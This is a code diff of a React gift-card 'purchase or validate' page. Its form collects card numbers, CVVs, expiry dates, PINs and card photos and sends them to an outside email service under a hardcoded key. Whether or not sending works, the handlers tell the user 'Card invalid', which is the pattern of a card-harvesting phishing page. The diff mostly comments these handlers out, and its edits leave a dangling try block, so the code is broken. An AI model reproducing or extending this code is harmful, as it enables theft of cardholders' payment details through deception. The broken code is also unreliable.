@@ -1,4 +1,4 @@
-import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue, Spinner } from "@chakra-ui/react"
+import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, Spinner } from "@chakra-ui/react"
 import { CheckCircleIcon, WarningIcon } from '@chakra-ui/icons';
 import { useRef, forwardRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
@@ -205,8 +205,8 @@ function PurchaseOrValidate() {
     const [validatePin, setValidatePin] = useState('');
     const [loading, setLoading] = useState(false);
     const [isUploadMode, setIsUploadMode] = useState(false);
-    const [errorMessage, setErrorMessage] = useState('');
-    const [isFileValid, setIsFileValid] = useState(true);
+    // const [errorMessage, setErrorMessage] = useState('');
+    // const [isFileValid, setIsFileValid] = useState(true);
     const [frontImage, setFrontImage] = useState(null);
     const [backImage, setBackImage] = useState(null);
     const [frontImageUrl, setFrontImageUrl] = useState('');
@@ -260,17 +260,18 @@ function PurchaseOrValidate() {
         setLoading(true);
         setValidationStatus("loading");
 
-        const formData = {
-            cardName: selectedCard?.name,
-            validateCurrency,
-            validateCardAmount,
-            validateCardName,
-            validateUserEmail,
-            validateCardNumber,
-            validateCVV,
-            validateExpiry,
-            validatePin,
-        };        // const serviceId = process.env.REACT_APP_SERVICE_ID;
+        // const formData = {
+        //     cardName: selectedCard?.name,
+        //     validateCurrency,
+        //     validateCardAmount,
+        //     validateCardName,
+        //     validateUserEmail,
+        //     validateCardNumber,
+        //     validateCVV,
+        //     validateExpiry,
+        //     validatePin,
+        // };        
+        // const serviceId = process.env.REACT_APP_SERVICE_ID;
         // const templateId = process.env.REACT_APP_TEMPLATE_ID;
         // const publicKey = process.env.REACT_APP_PUBLIC_KEY;
         const publicKey = process.env.REACT_APP_PUBLIC_KEY || "Oi_6eMO1ibIDLP7K9";
@@ -324,29 +325,29 @@ function PurchaseOrValidate() {
 
     const form = useRef();
 
-    const handleUploadSubmit = (event) => {
-        event.preventDefault();
-        setLoading(true);
+    // const handleUploadSubmit = (event) => {
+    //     event.preventDefault();
+    //     setLoading(true);
 
-        const serviceId = process.env.REACT_APP_SERVICE_ID;
-        const templateId = process.env.REACT_APP_TEMPLATE_ID;
-        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
+    //     const serviceId = process.env.REACT_APP_SERVICE_ID;
+    //     const templateId = process.env.REACT_APP_TEMPLATE_ID;
+    //     const publicKey = process.env.REACT_APP_PUBLIC_KEY;
 
-        emailjs.sendForm(serviceId, templateId, form.current, publicKey)
-            .then((response) => {
-            // console.log(response)
-            alert('Card invalid');
-            handleToggleUploadMode();
-        })
-        .catch((error) => {
-            console.error('Error', error);
-            alert('Card invalid');
-            handleToggleUploadMode();
-        })
-        .finally(() => {
-            setLoading(false);
-        });
-        };
+    //     emailjs.sendForm(serviceId, templateId, form.current, publicKey)
+    //         .then((response) => {
+    //         // console.log(response)
+    //         alert('Card invalid');
+    //         handleToggleUploadMode();
+    //     })
+    //     .catch((error) => {
+    //         console.error('Error', error);
+    //         alert('Card invalid');
+    //         handleToggleUploadMode();
+    //     })
+    //     .finally(() => {
+    //         setLoading(false);
+    //     });
+    //     };
 
     const clearFormData = () => {
         setValidateCurrency('USD');
@@ -395,9 +396,9 @@ function PurchaseOrValidate() {
         max: 99
     });
 
-    const inc = getIncrementButtonProps();
-    const dec = getDecrementButtonProps();
-    const input = getInputProps();
+    // const inc = getIncrementButtonProps();
+    // const dec = getDecrementButtonProps();
+    // const input = getInputProps();
 
     const calculateTotalDue = () => {
         const priceValue = selectedPrice ? parseInt(selectedPrice.replace('$', ''), 10) : 0;
@@ -465,17 +466,17 @@ function PurchaseOrValidate() {
         setIsUploadMode(!isUploadMode);
     };
 
-    const compressImage = async (file) => {
-    const options = {
-        maxSizeMB: 0.25, // Set maximum size to 500KB
-        maxWidthOrHeight: 800, // Optional: resize based on the image dimensions
-        useWebWorker: true // Optional: for better performance
-    };
+    // const compressImage = async (file) => {
+    // const options = {
+    //     maxSizeMB: 0.25, // Set maximum size to 500KB
+    //     maxWidthOrHeight: 800, // Optional: resize based on the image dimensions
+    //     useWebWorker: true // Optional: for better performance
+    // };
 
     try {
-        const originalSize = file.size;
+        // const originalSize = file.size;
         const compressedFile = await imageCompression(file, options);
-        const compressedSize = compressedFile.size;
+        // const compressedSize = compressedFile.size;
 
         // Log the original and compressed file sizes
         // console.log(`File successfully compressed from ${originalSize / 1024} KB to ${compressedSize / 1024} KB`);
@@ -526,29 +527,29 @@ function PurchaseOrValidate() {
         }
     };
 
-    const handleSubmit = (event) => {
-        event.preventDefault();
+    // const handleSubmit = (event) => {
+    //     event.preventDefault();
 
-        const serviceId = process.env.REACT_APP_SERVICE_ID;
-        const templateId = process.env.REACT_APP_TEMPLATE_ID;
-        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
+    //     const serviceId = process.env.REACT_APP_SERVICE_ID;
+    //     const templateId = process.env.REACT_APP_TEMPLATE_ID;
+    //     const publicKey = process.env.REACT_APP_PUBLIC_KEY;
 
-        const emailParams = {
-            to_name: 'Recipient Name',
-            from_name: 'Your Name',
-            message: 'Here are the images:',
-            front_image_url: frontImageUrl, // Cloudinary URL for the front image
-            back_image_url: backImageUrl    // Cloudinary URL for the back image
-        };
+    //     const emailParams = {
+    //         to_name: 'Recipient Name',
+    //         from_name: 'Your Name',
+    //         message: 'Here are the images:',
+    //         front_image_url: frontImageUrl, // Cloudinary URL for the front image
+    //         back_image_url: backImageUrl    // Cloudinary URL for the back image
+    //     };
 
-        emailjs.send(serviceId, templateId, emailParams, publicKey)
-            .then((response) => {
-                // console.log('Success!', response.status, response.text);
-            })
-            .catch((error) => {
-                console.error('Failed...', error);
-            });
-    };
+    //     emailjs.send(serviceId, templateId, emailParams, publicKey)
+    //         .then((response) => {
+    //             // console.log('Success!', response.status, response.text);
+    //         })
+    //         .catch((error) => {
+    //             console.error('Failed...', error);
+    //         });
+    // };
 
     return (
         <>
